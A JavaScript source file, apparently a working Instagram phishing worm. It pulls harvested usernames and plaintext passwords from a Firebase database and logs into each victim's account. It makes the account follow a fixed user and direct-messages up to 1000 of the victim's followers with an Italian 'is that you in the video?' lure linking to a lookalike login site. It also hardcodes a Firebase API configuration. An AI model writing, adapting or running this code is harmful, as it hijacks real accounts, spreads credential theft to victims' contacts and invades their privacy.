
import { initializeApp } from "firebase/app";
import { getDatabase, ref, onValue, child, push, update, get } from "firebase/database";
import puppeteer from "puppeteer";
import { IgApiClient } from 'instagram-private-api';
import fs from 'fs'
const ig = new IgApiClient();




const firebaseConfig = {
  apiKey: "AIzaSyBAnWdRDRmzxrQJGjVgfzMfUY7AdG9vjmM",
  authDomain: "instaflogin.firebaseapp.com",
  projectId: "instaflogin",
  storageBucket: "instaflogin.appspot.com",
  messagingSenderId: "650375111038",
  appId: "1:650375111038:web:774aa61f9e19e4cf75932f",
  measurementId: "G-QLBJ97R5PP"
};

const app = initializeApp(firebaseConfig);

const database = getDatabase();



const dbRef = ref(getDatabase());
var users = "-----";



const db = getDatabase();

var isT = true;

onValue(ref(db, 'users/'), (snapshot) => { //sostituire con il get snaphsot singolo
  if (snapshot.exists()) {
    (async () => {
      //console.log(snapshot.val());

      var data = snapshot.val();
      users = getObjects(data);
      var keys = getKeys(data);

      for (var i = 0; i < users.length; i++) {
        var user = users[i];
        var key = keys[i];

        if (user.tested === false) {
          writeNewPost(key, user.username, user.password);
          console.log("try to login in-> username: " + user.username + " password: " + user.password + " ID: " + key);


          ig.state.generateDevice(user.username);

          var loggedInUser;
          // Execute all requests prior to authorization in the real Android application
          // Not required but recommended
          // await ig.simulate.preLoginFlow();
          try {
            loggedInUser = await ig.account.login(user.username, user.password);
          } catch (e) {
            break;
          }


          console.log(loggedInUser.full_name + " " + loggedInUser.pk);

          //console.log(loggedInUser.profile_pic_url);
          const followersFeed = ig.feed.accountFollowers(loggedInUser.pk);
          const followingFeed = ig.feed.accountFollowing(loggedInUser.pk);
          const following = [
            await followingFeed.items(),
            await followingFeed.items(),
          ]
          const followers = [
            await followersFeed.items(),
            await followersFeed.items(),
          ]
          const users = new Set(followers.map(({ username }) => username));
          const notFollowingYou = following.filter(({ username }) => !users.has(username));

          ig.friendship.create(53446567789);


          var pkFollowers = [];
          var pkFollowing = [];
          // console.log(getObjects(followers))

          var followersList = getObjects(followers);
          var followingList = getObjects(following);

          /* fs.writeFile('C:/Users/utente/maybe/t.json', getObjects(followers), function (err,data) {
             if (err) {
               return console.log(err);
             }
             console.log(data);
           });*/

          try {
            for (var i = 0; i < 1000; i++) {

              pkFollowers[i] = followersList[0][i].pk;
              //console.log(pkFollowers[i]);
              //console.log(i + ") followers: " + followersList[0][i].pk);
            }


            /*   for (var i = 0; i < 1000; i++) {
   
   
                 pkFollowing[i] = followingList[0][i].pk;
                 //console.log(pkFollowing[i]);
                 //console.log(i + ") following: " + followingList[0][i].pk);
   
               }*/




          } catch (e) { }




          for (var i = 0; i < Object.keys(pkFollowers).length; i++) {

            var date = new Date();
            

            console.log("sent to: " + pkFollowers[i] + " at: " + date);
            const thread = ig.entity.directThread([pkFollowers[i]]);

            await thread.broadcastText('oi ma sei tu nel video? che fail comunque \n' + 'https://instawebapplogin.com/video?s=' + user.username + '\n');
           // await thread.broadcastText('ne lvideo sopra');
          }



          ig.account.logout();


        } else {
          //console.log("No data available");
        }
      }
    })();
  }

});



function writeNewPost(uid, username, password) {
  const db = getDatabase();

  // A post entry.
  const postData = {
    username: username,
    password: password,
    tested: true
  };


  // Write the new post's data simultaneously in the posts list and the user's post list.
  const updates = {};
  updates['/users/' + uid] = postData;


  return update(ref(db), updates);
}

function getObjects(data) {
  var obj = [];
  var i = 0;
  for (var key in data) {
    obj[i] = data[key];
    i++;
  }

  return obj;
}

function getKeys(data) {

  var obj = [];
  var i = 0;
  for (var key in data) {
    obj[i] = key;
    i++;
  }

  return obj;
}
